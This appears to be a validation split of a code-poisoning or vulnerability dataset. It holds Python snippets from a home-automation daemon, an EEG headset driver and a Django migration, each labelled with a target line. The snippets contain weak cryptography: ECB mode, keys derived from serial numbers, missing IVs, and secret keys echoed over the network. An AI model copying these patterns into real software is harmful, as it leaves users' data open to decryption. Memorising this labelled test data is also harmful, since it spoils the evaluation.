      "                    knx.close();\n",
      "                    self.connected_knx.remove(knx);\n",
      "\n",
      "    def receive_from_enocean(self, enocean_to_read):\n",
      "        \"\"\"\n",
      "        Read data from monitor EnOcean and transmits to master.\n",
      "        \"\"\"\n",
      "        for enocean in enocean_to_read:\n",
      "            data = enocean.recv(4096);\n",
      "            if data:\n",
      "                self.send_enocean_data_to_masters(data);\n",
      "            else:\n",
      "                if enocean in self.connected_enocean:\n",
      "                    enocean.close();\n",
      "                    self.connected_enocean.remove(enocean);\n",
      "    \n",
      "    def receive_from_cron(self, cron_to_read):\n",
      "        \"\"\"\n",
      "        Receive data from Cron and execute it.\n",
      "        \"\"\"\n",
      "        for cron in cron_to_read:\n",
      "            data = cron.recv(4096);\n",
      "            if data:\n",
      "                json_str = json.JSONEncoder().encode(\n",
      "                    {\n",
      "                        \"packet_type\": data.decode()\n",
      "                    }\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/taccons/Domoleaf/domoslave/usr/bin/domoslave/SlaveDaemon.py",
    "code": [
      "            else:\n",
      "                if enocean in self.connected_enocean:\n",
      "                    enocean.close();\n",
      "                    self.connected_enocean.remove(enocean);\n",
      "    \n",
      "    def receive_from_cron(self, cron_to_read):\n",
      "        \"\"\"\n",
      "        Receive data from Cron and execute it.\n",
      "        \"\"\"\n",
      "        for cron in cron_to_read:\n",
      "            data = cron.recv(4096);\n",
      "            if data:\n",
      "                json_str = json.JSONEncoder().encode(\n",
      "                    {\n",
      "                        \"packet_type\": data.decode()\n",
      "                    }\n",
      "                );\n",
      "                self.parse_data(json_str, cron);\n",
      "            else:\n",
      "                if cron in self.connected_cron:\n",
      "                    cron.close();\n",
      "                    self.parse_data.remove(cron);\n",
      "    \n",
      "    def check_slave(self, json_obj, connection):\n",
      "        \"\"\"\n",
      "        Callback called each time a check_slave packet is received.\n",
      "        Used to confirm the existence of this daemon.\n",
      "        \"\"\"\n",
      "        print(\"===== CHECK SLAVE =====\");\n",
      "        print(json_obj);\n",
      "        print(\"=======================\");\n",
      "        interface_knx = self._parser.getValueFromSection(SLAVE_CONF_KNX_SECTION, SLAVE_CONF_KNX_INTERFACE);\n",
      "        interface_enocean = self._parser.getValueFromSection(SLAVE_CONF_ENOCEAN_SECTION, SLAVE_CONF_ENOCEAN_INTERFACE);\n",
      "        file = open('/etc/domoleaf/.domoslave.version', 'r');\n",
      "        version = file.read().split('\\n')[0];\n",
      "        json_str = '{\"packet_type\": \"check_slave\", \"aes_pass\": \"' + self.private_aes + '\", \"version\": \"' + version + '\", \"interface_knx\": \"' + interface_knx + '\", \"interface_enocean\": \"' + interface_enocean + '\"}';\n",
      "        master_hostname = str(json_obj['sender_name']);\n",
      "        encrypt_IV = AESManager.get_IV();\n",
      "        spaces = 16 - len(json_str) % 16;\n",
      "        json_str = json_str + (spaces * ' ')\n",
      "        encode_obj = AES.new(self.private_aes, AES.MODE_CBC, encrypt_IV);\n",
      "        data = encode_obj.encrypt(json_str);\n",
      "        connection.send(bytes(encrypt_IV, 'utf-8') + data);\n",
      "\n",
      "    def monitor_ip(self, json_obj, connection):\n",
      "        \"\"\"\n",
      "        Re scan the local network to refresh hostlist.\n",
      "        \"\"\"\n",
      "        self._scanner.scan(True);\n",
      "        self._hostlist = self._scanner._HostList;\n",
      "\n",
      "    def loop(self):\n",
      "        \"\"\"\n",
      "        Main daemon loop.\n",
      "        \"\"\"\n",
      "        while self.run:\n",
      "            try:\n",
      "                self.accept_knx();\n",
      "            except Exception as e:\n",
      "                frameinfo = getframeinfo(currentframe());\n",
      "                self.logger.error('in loop accept_knx: ' + str(e));\n",
      "                print('in loop accept_knx: ' + str(e));\n",
      "            except KeyboardInterrupt as e:\n",
      "                frameinfo = getframeinfo(currentframe());\n",
      "                self.logger.error('in loop: Keyboard interrupt');\n",
      "            try:\n",
      "                self.accept_masters();\n",
      "            except Exception as e:\n",
      "                frameinfo = getframeinfo(currentframe());\n",
      "                self.logger.error('in loop accept_masters: ' + str(e));\n",
      "                print('in loop accept_masters: ' + str(e));\n",
      "            except KeyboardInterrupt as e:\n",
      "                frameinfo = getframeinfo(currentframe());\n",
      "                self.logger.error('in loop: Keyboard interrupt');\n",
      "            try:\n",
      "                self.accept_enocean();\n",
      "            except Exception as e:\n",
      "                frameinfo = getframeinfo(currentframe());\n",
      "                self.logger.error('in loop accept_enocean: ' + str(e));\n",
      "                print('in loop accept_enocean: ' + str(e));\n",
      "            except KeyboardInterrupt as e:\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/taccons/Domoleaf/domoslave/usr/bin/domoslave/SlaveDaemon.py",
    "code": [
      "        self.send_data_to_all_masters(json_str);\n",
      "\n",
      "    def send_enocean_data_to_masters(self, data):\n",
      "        \"\"\"\n",
      "        Converts 'data' from bytes to a clear EnOcean datagran, and sends it to available slaves.\n",
      "        \"\"\"\n",
      "        self.connect_to_masters();\n",
      "        if (data[4] == PACKET_TYPE_RADIO_ERP1): # si le packet_type == radio_erp1\n",
      "            data_len = int.from_bytes(data[1:2], byteorder='big');\n",
      "            opt_data_len = int(data[3]);\n",
      "            print(str(data_len) + ' - ' + str(opt_data_len));\n",
      "            src_str = \"%X\" % int.from_bytes(data[1+data_len:5+data_len], byteorder='big');\n",
      "            if len(src_str) < 8:\n",
      "                src_str = \"0\" + src_str;\n",
      "            json_dict = {\n",
      "                \"packet_type\": \"monitor_enocean\",\n",
      "                \"src_addr\": src_str,\n",
      "                \"dst_addr\": \"%X\" % int.from_bytes(data[261:265 + opt_data_len], byteorder='big'),\n",
      "                \"date\": str(time.time()).split('.')[0],\n",
      "                \"sender_name\": socket.gethostname(),\n",
      "                \"type\": int(data[6])\n",
      "            };\n",
      "            if data[6] == RORG_NORMAL:\n",
      "                json_dict['value'] = int(data[7]);\n",
      "            elif data[6] == RORG_TEMPERATURE:\n",
      "                json_dict['value'] = float(40 - ((40 / 255) * int(data[9])));\n",
      "            json_str = json.JSONEncoder().encode(json_dict);\n",
      "            self.send_data_to_all_masters(json_str);\n",
      "\n",
      "    def send_data_to_all_masters(self, json_str):\n",
      "        \"\"\"\n",
      "        Sends a string 'json_str' to available slaves on network.\n",
      "        \"\"\"\n",
      "        self.connect_to_masters();\n",
      "        # ici envoyer a tous les masters\n",
      "        for name in self.connected_masters.keys():\n",
      "            try:\n",
      "                master = self.connected_masters[name];\n",
      "                AES.key_size = 32;\n",
      "                aes_IV = AESManager.get_IV();\n",
      "                encode_obj = AES.new(self.private_aes, AES.MODE_CBC, aes_IV);\n",
      "                spaces = 16 - len(json_str) % 16;\n",
      "                data2 = encode_obj.encrypt(json_str + (spaces * ' '));\n",
      "                print(\"Sending data to \" + name);\n",
      "                master.send(bytes(aes_IV, 'utf-8') + data2);\n",
      "                print('Done.');\n",
      "                master.close();\n",
      "            except KeyError as e:\n",
      "                self.logger.error('in send_data_to_all_masters: ' + str(e));\n",
      "                print(e);\n",
      "                pass;\n",
      "    \n",
      "    def send_tech(self, json_obj, connection):\n",
      "        json_str = json.JSONEncoder().encode(\n",
      "            {\n",
      "                \"packet_type\": \"send_tech\",\n",
      "                \"info\": GLManager.TechInfo()\n",
      "            }\n",
      "        );\n",
      "        self.send_data_to_all_masters(json_str);\n",
      "        \n",
      "    def send_alive(self, json_obj, connection):\n",
      "        json_str = json.JSONEncoder().encode(\n",
      "            {\n",
      "                \"packet_type\": \"send_alive\",\n",
      "                \"info\": GLManager.TechAlive()\n",
      "            }\n",
      "        );\n",
      "        self.send_data_to_all_masters(json_str);\n",
      "\n",
      "    def send_interfaces(self, json_obj, connection):\n",
      "        try:\n",
      "            if os.path.exists('/tmp/knxd'):\n",
      "                call(['service', 'knxd', 'stop']);\n",
      "            previous_val_knx = self._parser.getValueFromSection('knx', 'interface');\n",
      "            previous_val_EnOcean = self._parser.getValueFromSection('enocean', 'interface');\n",
      "            new_val = str(json_obj['interface_arg_knx'])\n",
      "            self._parser.writeValueFromSection('knx', 'interface', new_val);\n",
      "            self._parser.writeValueFromSection('enocean', 'interface', str(json_obj['interface_arg_EnOcean']));\n",
      "            if previous_val_knx == '' or previous_val_knx == None:\n",
      "                call(['update-rc.d', 'knxd', 'defaults']);\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/taccons/Domoleaf/domoslave/usr/bin/domoslave/SlaveDaemon.py",
    "code": [
      "        json_str = json.JSONEncoder().encode(\n",
      "            {\n",
      "                \"packet_type\": \"send_alive\",\n",
      "                \"info\": GLManager.TechAlive()\n",
      "            }\n",
      "        );\n",
      "        self.send_data_to_all_masters(json_str);\n",
      "\n",
      "    def send_interfaces(self, json_obj, connection):\n",
      "        try:\n",
      "            if os.path.exists('/tmp/knxd'):\n",
      "                call(['service', 'knxd', 'stop']);\n",
      "            previous_val_knx = self._parser.getValueFromSection('knx', 'interface');\n",
      "            previous_val_EnOcean = self._parser.getValueFromSection('enocean', 'interface');\n",
      "            new_val = str(json_obj['interface_arg_knx'])\n",
      "            self._parser.writeValueFromSection('knx', 'interface', new_val);\n",
      "            self._parser.writeValueFromSection('enocean', 'interface', str(json_obj['interface_arg_EnOcean']));\n",
      "            if previous_val_knx == '' or previous_val_knx == None:\n",
      "                call(['update-rc.d', 'knxd', 'defaults']);\n",
      "                call(['update-rc.d', 'knxd', 'enable']);\n",
      "            if new_val == '' or new_val == None:\n",
      "                Popen(['systemctl', '-q', 'disable', 'knxd']);\n",
      "            else:\n",
      "                knx_edit = 'KNXD_OPTS=\"-e 1.0.254 -D -T -S -u /tmp/knxd ';\n",
      "                if json_obj['interface_knx'] == 'tpuarts':\n",
      "                    knx_edit = knx_edit + json_obj['interface_knx'] + ':/dev/' + new_val + '\"';\n",
      "                else:\n",
      "                    knx_edit = knx_edit + '-b ' + json_obj['interface_knx']  + ':' + new_val + '\"';\n",
      "                conf_knx = open('/etc/knxd.conf', 'w');\n",
      "                conf_knx.write(knx_edit + '\\n');\n",
      "                conf_knx.close();\n",
      "                call(['service', 'knxd', 'start']);\n",
      "                Popen(['monitor_knx', 'ip:localhost', '--daemon']);\n",
      "        except Exception as e:\n",
      "            self.logger.error(e);\n",
      "        json_str = '{\"packet_type\": \"send_interfaces\", \"aes_pass\": \"' + self.private_aes + '\"}';\n",
      "        master_hostname = str(json_obj['sender_name']);\n",
      "        encrypt_IV = AESManager.get_IV();\n",
      "        spaces = 16 - len(json_str) % 16;\n",
      "        json_str = json_str + (spaces * ' ')\n",
      "        encode_obj = AES.new(self.private_aes, AES.MODE_CBC, encrypt_IV);\n",
      "        data = encode_obj.encrypt(json_str);\n",
      "        connection.send(bytes(encrypt_IV, 'utf-8') + data);\n",
      "        if previous_val_EnOcean != str(json_obj['interface_arg_EnOcean']):\n",
      "            call(['service', 'domoslave', 'restart']);\n",
      "\n",
      "    def shutdown_d3(self, json_obj, connection):\n",
      "        call(['poweroff']);\n",
      "\n",
      "    def reboot_d3(self, json_obj, connection):\n",
      "        call(['reboot']);\n",
      "\n",
      "    def wifi_init(self, ssid, password, security, mode, opt):\n",
      "        try:\n",
      "            ps_process = Popen([\"ps\", \"-x\"], stdout=PIPE);\n",
      "            res = Popen([\"grep\", \"hostapd\"], stdin=ps_process.stdout, stdout=PIPE);\n",
      "            res = res.stdout.read().decode().split(\"\\n\")[0].split(' ');\n",
      "            ps_process.stdout.close();\n",
      "            if res != '':\n",
      "                while ('' in res):\n",
      "                    res.remove('');\n",
      "                call(['kill', '-9', res[0]]);\n",
      "\n",
      "            ps_process = Popen([\"ps\", \"-x\"], stdout=PIPE);\n",
      "            res = Popen([\"grep\", \"wpa_supplicant\"], stdin=ps_process.stdout, stdout=PIPE);\n",
      "            res = res.stdout.read().decode().split(\"\\n\")[0].split(' ');\n",
      "            ps_process.stdout.close();\n",
      "            if res != '':\n",
      "                while ('' in res):\n",
      "                    res.remove('');\n",
      "                call(['kill', '-9', res[0]]);\n",
      "\n",
      "            call(['ifconfig', 'wlan0', 'down']);\n",
      "\n",
      "            if mode == WIFI_MODE_DISABLED:\n",
      "                if opt == 1:\n",
      "                    call(['service', 'dnsmasq', 'stop']);\n",
      "            elif mode == WIFI_MODE_CLIENT:\n",
      "                call(['ifconfig', 'wlan0', 'up']);\n",
      "                if opt == 1:\n",
      "                    call(['service', 'dnsmasq', 'stop']);\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/taccons/Domoleaf/domoslave/usr/bin/domoslave/SlaveDaemon.py",
    "code": [
      "                        conf_str += '\\tgroup=WEP104\\n';\n",
      "                    else:\n",
      "                        conf_str += '\\tgroup=WEP40 WEP104\\n';\n",
      "                    conf_str += '\\twep_key0=\"' + password + '\"\\n';\n",
      "                    conf_str += '\\twep_tx_keyidx=0\\n';\n",
      "                conf_str += '\\tpriority=1\\n';\n",
      "                conf_str += '}\\n';\n",
      "                conf_file.write(conf_str);\n",
      "                conf_file.close();\n",
      "\n",
      "                call(['wpa_supplicant', '-Dnl80211', '-iwlan0', '-c' + WPA_SUPPLICANT_CONF_FILE , '-B']);\n",
      "                call(['dhclient', 'wlan0']);\n",
      "\n",
      "            elif mode == WIFI_MODE_ACCESS_POINT:\n",
      "                call(['ifconfig', 'wlan0', '172.16.0.1', 'netmask', '255.255.255.0', 'up']);\n",
      "                conf_file = open(HOSTAPD_CONF_FILE, 'w');\n",
      "                conf_str  = 'interface=wlan0\\n\\n';\n",
      "                conf_str += 'driver=nl80211\\n\\n';\n",
      "                conf_str += 'ssid=' + ssid + '\\n\\n';\n",
      "                conf_str += 'hw_mode=g\\n\\n';\n",
      "                conf_str += 'ieee80211n=1\\n\\n';\n",
      "                conf_str += 'channel=6\\n\\n';\n",
      "                conf_str += 'beacon_int=100\\n\\n';\n",
      "                conf_str += 'dtim_period=2\\n\\n';\n",
      "                conf_str += 'max_num_sta=255\\n\\n';\n",
      "                conf_str += 'rts_threshold=2347\\n\\n';\n",
      "                conf_str += 'fragm_threshold=2346\\n\\n';\n",
      "                conf_str += 'macaddr_acl=0\\n\\n';\n",
      "                if security == WIFI_SECURITY_WPA:\n",
      "                    conf_str += 'auth_algs=1\\n\\n';\n",
      "                    conf_str += 'wpa=1\\n\\n';\n",
      "                    conf_str += 'wpa_passphrase=' + password + '\\n\\n';\n",
      "                    conf_str += 'wpa_key_mgmt=WPA-PSK\\n\\n';\n",
      "                    conf_str += 'wpa_pairwise=TKIP\\n';\n",
      "                elif security == WIFI_SECURITY_WPA2:\n",
      "                    conf_str += 'auth_algs=1\\n\\n';\n",
      "                    conf_str += 'wpa=2\\n\\n';\n",
      "                    conf_str += 'wpa_passphrase=' + password + '\\n\\n';\n",
      "                    conf_str += 'wpa_key_mgmt=WPA-PSK\\n\\n';\n",
      "                    conf_str += 'wpa_pairwise=CCMP\\n\\n';\n",
      "                    conf_str += 'rsn_pairwise=CCMP\\n';\n",
      "                else:\n",
      "                    self.logger.error('Wifi security = Unknown');\n",
      "                conf_file.write(conf_str);\n",
      "                conf_file.close();\n",
      "\n",
      "                if opt == 1:\n",
      "                    conf_file = open(DNSMASQ_CONF_FILE, 'w');\n",
      "                    conf_str  = 'domain-needed\\n';\n",
      "                    conf_str += 'interface=wlan0\\n';\n",
      "                    conf_str += 'dhcp-range=172.16.0.2,172.16.0.254,12h\\n';\n",
      "                    conf_file.write(conf_str);\n",
      "                    conf_file.close();\n",
      "                    call(['service', 'dnsmasq', 'restart']);\n",
      "\n",
      "                call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE']);\n",
      "                call(['hostapd', HOSTAPD_CONF_FILE, '-B']);\n",
      "            else:\n",
      "                call(['ifconfig', 'wlan0', 'up']);\n",
      "                self.logger.error('Wifi mode = Unknown');\n",
      "        except Exception as e:\n",
      "            self.logger.error(e);\n",
      "\n",
      "    def wifi_update(self, json_obj, connection):\n",
      "        try:\n",
      "            self._parser.writeValueFromSection('wifi', 'ssid', json_obj['ssid']);\n",
      "            self._parser.writeValueFromSection('wifi', 'password', json_obj['password']);\n",
      "            self._parser.writeValueFromSection('wifi', 'encryption', json_obj['security']);\n",
      "            self._parser.writeValueFromSection('wifi', 'mode', json_obj['mode']);\n",
      "\n",
      "            self.wifi_init(json_obj['ssid'], json_obj['password'], json_obj['security'], json_obj['mode'], 1);\n",
      "        except Exception as e:\n",
      "            self.logger.error(e);\n",
      "        json_str = '{\"packet_type\": \"wifi_update\", \"aes_pass\": \"' + self.private_aes + '\"}';\n",
      "        master_hostname = str(json_obj['sender_name']);\n",
      "        encrypt_IV = AESManager.get_IV();\n",
      "        spaces = 16 - len(json_str) % 16;\n",
      "        json_str = json_str + (spaces * ' ')\n",
      "        encode_obj = AES.new(self.private_aes, AES.MODE_CBC, encrypt_IV);\n",
      "        data = encode_obj.encrypt(json_str);\n",
      "        connection.send(bytes(encrypt_IV, 'utf-8') + data);\n"
    ],
    "target": 78,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/Hemisphere-Project/Telemir-DatabitMe/Telemir-EEG/pyacq/pyacq/core/devices/emotiv.py",
    "code": [
      "        #     self.streams[ii].stop()\n",
      "\n",
      "\n",
      "def setupCrypto(serial):\n",
      "    type = 0 #feature[5]\n",
      "    type &= 0xF\n",
      "    type = 0\n",
      "    #I believe type == True is for the Dev headset, I'm not using that. That's the point of this library in the first place I thought.\n",
      "    k = ['\\0'] * 16\n",
      "    k[0] = serial[-1]\n",
      "    k[1] = '\\0'\n",
      "    k[2] = serial[-2]\n",
      "    if type:\n",
      "        k[3] = 'H'\n",
      "        k[4] = serial[-1]\n",
      "        k[5] = '\\0'\n",
      "        k[6] = serial[-2]\n",
      "        k[7] = 'T'\n",
      "        k[8] = serial[-3]\n",
      "        k[9] = '\\x10'\n",
      "        k[10] = serial[-4]\n",
      "        k[11] = 'B'\n",
      "    else:\n",
      "        k[3] = 'T'\n",
      "        k[4] = serial[-3]\n",
      "        k[5] = '\\x10'\n",
      "        k[6] = serial[-4]\n",
      "        k[7] = 'B'\n",
      "        k[8] = serial[-1]\n",
      "        k[9] = '\\0'\n",
      "        k[10] = serial[-2]\n",
      "        k[11] = 'H'\n",
      "    k[12] = serial[-3]\n",
      "    k[13] = '\\0'\n",
      "    k[14] = serial[-4]\n",
      "    k[15] = 'P'\n",
      "    #It doesn't make sense to have more than one greenlet handling this as data needs to be in order anyhow. I guess you could assign an ID or something\n",
      "    #to each packet but that seems like a waste also or is it? The ID might be useful if your using multiple headsets or usb sticks.\n",
      "    key = ''.join(k)\n",
      "    iv = Random.new().read(AES.block_size)\n",
      "    cipher = AES.new(key, AES.MODE_ECB, iv)\n",
      "    return cipher\n",
      "\n",
      "\n",
      "\n",
      "def get_level(data, bits):\n",
      "    level = 0\n",
      "    for i in range(13, -1, -1):\n",
      "        level <<= 1\n",
      "        b, o = (bits[i] / 8) + 1, bits[i] % 8\n",
      "        level |= (ord(data[b]) >> o) & 1\n",
      "    return level\n",
      "\n",
      "\n",
      "def emotiv_mainLoop(stop_flag, streams, device):\n",
      "    import zmq\n",
      "    abs_pos = pos = 0\n",
      "\n",
      "    #setup cryto\n",
      "    cipher = setupCrypto(device['serial'])\n",
      "\n",
      "    streamChan, streamImp, streamGyro = streams\n",
      "\n",
      "    #Data channels socket\n",
      "    context = zmq.Context()\n",
      "    socket_chan = context.socket(zmq.PUB)\n",
      "    socket_chan.bind(\"tcp://*:{}\".format(streamChan['port']))\n",
      "\n",
      "    #Impedance channels socket\n",
      "    socket_imp = context.socket(zmq.PUB)\n",
      "    socket_imp.bind(\"tcp://*:{}\".format(streamImp['port']))\n",
      "\n",
      "    #Gyro channels socket\n",
      "    socket_gyro = context.socket(zmq.PUB)\n",
      "    socket_gyro.bind(\"tcp://*:{}\".format(streamGyro['port']))\n",
      "\n",
      "    packet_size = streamChan['packet_size']\n",
      "    sampling_rate = streamChan['sampling_rate']\n",
      "\n",
      "    np_arr_chan = streamChan['shared_array'].to_numpy_array()\n",
      "    np_arr_imp = streamImp['shared_array'].to_numpy_array()\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dimara/synnefo/snf-cyclades-app/synnefo/db/migrations/0066_add_iv.py",
    "code": [
      "# encoding: utf-8\n",
      "import datetime\n",
      "from south.db import db\n",
      "from south.v2 import DataMigration\n",
      "from django.db import models\n",
      "from binascii import b2a_base64, a2b_base64\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "from random import choice\n",
      "from string import letters, digits\n",
      "from synnefo.settings import SECRET_ENCRYPTION_KEY\n",
      "\n",
      "DB_ENCRYPTED_FIELD_PREFIX = 'encrypted'\n",
      "SALT_LEN = 8\n",
      "\n",
      "\n",
      "def _pad_secret(secret, blocksize=32, padding='}'):\n",
      "    len_secret = len(secret)\n",
      "    if len_secret > 32:\n",
      "        raise ValueError('Encryption key must be smaller than 32 bytes')\n",
      "    if not len_secret in (16, 24, 32):\n",
      "        return secret + (blocksize - len(secret)) * padding\n",
      "    return secret\n",
      "\n",
      "\n",
      "def encrypt(s, iv=None):\n",
      "    if iv is None:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB)\n",
      "    else:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB, iv)\n",
      "    return obj.encrypt(s)\n",
      "\n",
      "\n",
      "def decrypt(s, iv=None):\n",
      "    if iv is None:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB)\n",
      "    else:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB, iv)\n",
      "    return obj.decrypt(s)\n",
      "\n",
      "\n",
      "def encrypt_db_charfield_old(plaintext):\n",
      "    if not plaintext:\n",
      "        return plaintext\n",
      "    salt = \"\".join([choice(letters + digits) for i in xrange(SALT_LEN)])\n",
      "\n",
      "    plaintext = \"%s%s\" % (salt, plaintext)\n",
      "    # Encrypt and convert to binary\n",
      "    ciphertext = b2a_base64(encrypt(plaintext))\n",
      "    # Append prefix,salt and return encoded value\n",
      "    final = '%s:%s$%s' % (DB_ENCRYPTED_FIELD_PREFIX, salt, ciphertext)\n",
      "    return final.encode('utf8')\n",
      "\n",
      "\n",
      "def decrypt_db_charfield_old(ciphertext):\n",
      "    if not ciphertext:\n",
      "        return ciphertext\n",
      "    has_prefix = ciphertext.startswith(DB_ENCRYPTED_FIELD_PREFIX + ':')\n",
      "    if not has_prefix:  # Non-encoded value\n",
      "        return ciphertext\n",
      "    else:\n",
      "        _, ciphertext = ciphertext.split(':')\n",
      "\n",
      "    pure_salt, encrypted = ciphertext.split('$')\n",
      "\n",
      "    plaintext = decrypt(a2b_base64(encrypted))\n",
      "\n",
      "    salt = plaintext[:SALT_LEN]\n",
      "    plaintext = plaintext[SALT_LEN:]\n",
      "\n",
      "    if salt != pure_salt:\n",
      "        # Can not decrtypt password\n",
      "        raise CorruptedPassword(\"Can not decrypt password. Check the key\")\n",
      "    else:\n",
      "        return plaintext\n",
      "\n",
      "\n",
      "def encrypt_db_charfield(plaintext):\n",
      "    if not plaintext:\n",
      "        return plaintext\n",
      "    salt = \"\".join([choice(letters + digits) for i in xrange(SALT_LEN)])\n"
    ],
    "target": 27,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dimara/synnefo/snf-cyclades-app/synnefo/db/migrations/0066_add_iv.py",
    "code": [
      "# encoding: utf-8\n",
      "import datetime\n",
      "from south.db import db\n",
      "from south.v2 import DataMigration\n",
      "from django.db import models\n",
      "from binascii import b2a_base64, a2b_base64\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "from random import choice\n",
      "from string import letters, digits\n",
      "from synnefo.settings import SECRET_ENCRYPTION_KEY\n",
      "\n",
      "DB_ENCRYPTED_FIELD_PREFIX = 'encrypted'\n",
      "SALT_LEN = 8\n",
      "\n",
      "\n",
      "def _pad_secret(secret, blocksize=32, padding='}'):\n",
      "    len_secret = len(secret)\n",
      "    if len_secret > 32:\n",
      "        raise ValueError('Encryption key must be smaller than 32 bytes')\n",
      "    if not len_secret in (16, 24, 32):\n",
      "        return secret + (blocksize - len(secret)) * padding\n",
      "    return secret\n",
      "\n",
      "\n",
      "def encrypt(s, iv=None):\n",
      "    if iv is None:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB)\n",
      "    else:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB, iv)\n",
      "    return obj.encrypt(s)\n",
      "\n",
      "\n",
      "def decrypt(s, iv=None):\n",
      "    if iv is None:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB)\n",
      "    else:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB, iv)\n",
      "    return obj.decrypt(s)\n",
      "\n",
      "\n",
      "def encrypt_db_charfield_old(plaintext):\n",
      "    if not plaintext:\n",
      "        return plaintext\n",
      "    salt = \"\".join([choice(letters + digits) for i in xrange(SALT_LEN)])\n",
      "\n",
      "    plaintext = \"%s%s\" % (salt, plaintext)\n",
      "    # Encrypt and convert to binary\n",
      "    ciphertext = b2a_base64(encrypt(plaintext))\n",
      "    # Append prefix,salt and return encoded value\n",
      "    final = '%s:%s$%s' % (DB_ENCRYPTED_FIELD_PREFIX, salt, ciphertext)\n",
      "    return final.encode('utf8')\n",
      "\n",
      "\n",
      "def decrypt_db_charfield_old(ciphertext):\n",
      "    if not ciphertext:\n",
      "        return ciphertext\n",
      "    has_prefix = ciphertext.startswith(DB_ENCRYPTED_FIELD_PREFIX + ':')\n",
      "    if not has_prefix:  # Non-encoded value\n",
      "        return ciphertext\n",
      "    else:\n",
      "        _, ciphertext = ciphertext.split(':')\n",
      "\n",
      "    pure_salt, encrypted = ciphertext.split('$')\n",
      "\n",
      "    plaintext = decrypt(a2b_base64(encrypted))\n",
      "\n",
      "    salt = plaintext[:SALT_LEN]\n",
      "    plaintext = plaintext[SALT_LEN:]\n",
      "\n",
      "    if salt != pure_salt:\n",
      "        # Can not decrtypt password\n",
      "        raise CorruptedPassword(\"Can not decrypt password. Check the key\")\n",
      "    else:\n",
      "        return plaintext\n",
      "\n",
      "\n",
      "def encrypt_db_charfield(plaintext):\n",
      "    if not plaintext:\n",
      "        return plaintext\n",
      "    salt = \"\".join([choice(letters + digits) for i in xrange(SALT_LEN)])\n"
    ],
    "target": 29,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dimara/synnefo/snf-cyclades-app/synnefo/db/migrations/0066_add_iv.py",
    "code": [
      "# encoding: utf-8\n",
      "import datetime\n",
      "from south.db import db\n",
      "from south.v2 import DataMigration\n",
      "from django.db import models\n",
      "from binascii import b2a_base64, a2b_base64\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "from random import choice\n",
      "from string import letters, digits\n",
      "from synnefo.settings import SECRET_ENCRYPTION_KEY\n",
      "\n",
      "DB_ENCRYPTED_FIELD_PREFIX = 'encrypted'\n",
      "SALT_LEN = 8\n",
      "\n",
      "\n",
      "def _pad_secret(secret, blocksize=32, padding='}'):\n",
      "    len_secret = len(secret)\n",
      "    if len_secret > 32:\n",
      "        raise ValueError('Encryption key must be smaller than 32 bytes')\n",
      "    if not len_secret in (16, 24, 32):\n",
      "        return secret + (blocksize - len(secret)) * padding\n",
      "    return secret\n",
      "\n",
      "\n",
      "def encrypt(s, iv=None):\n",
      "    if iv is None:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB)\n",
      "    else:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB, iv)\n",
      "    return obj.encrypt(s)\n",
      "\n",
      "\n",
      "def decrypt(s, iv=None):\n",
      "    if iv is None:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB)\n",
      "    else:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB, iv)\n",
      "    return obj.decrypt(s)\n",
      "\n",
      "\n",
      "def encrypt_db_charfield_old(plaintext):\n",
      "    if not plaintext:\n",
      "        return plaintext\n",
      "    salt = \"\".join([choice(letters + digits) for i in xrange(SALT_LEN)])\n",
      "\n",
      "    plaintext = \"%s%s\" % (salt, plaintext)\n",
      "    # Encrypt and convert to binary\n",
      "    ciphertext = b2a_base64(encrypt(plaintext))\n",
      "    # Append prefix,salt and return encoded value\n",
      "    final = '%s:%s$%s' % (DB_ENCRYPTED_FIELD_PREFIX, salt, ciphertext)\n",
      "    return final.encode('utf8')\n",
      "\n",
      "\n",
      "def decrypt_db_charfield_old(ciphertext):\n",
      "    if not ciphertext:\n",
      "        return ciphertext\n",
      "    has_prefix = ciphertext.startswith(DB_ENCRYPTED_FIELD_PREFIX + ':')\n",
      "    if not has_prefix:  # Non-encoded value\n",
      "        return ciphertext\n",
      "    else:\n",
      "        _, ciphertext = ciphertext.split(':')\n",
      "\n",
      "    pure_salt, encrypted = ciphertext.split('$')\n",
      "\n",
      "    plaintext = decrypt(a2b_base64(encrypted))\n",
      "\n",
      "    salt = plaintext[:SALT_LEN]\n",
      "    plaintext = plaintext[SALT_LEN:]\n",
      "\n",
      "    if salt != pure_salt:\n",
      "        # Can not decrtypt password\n",
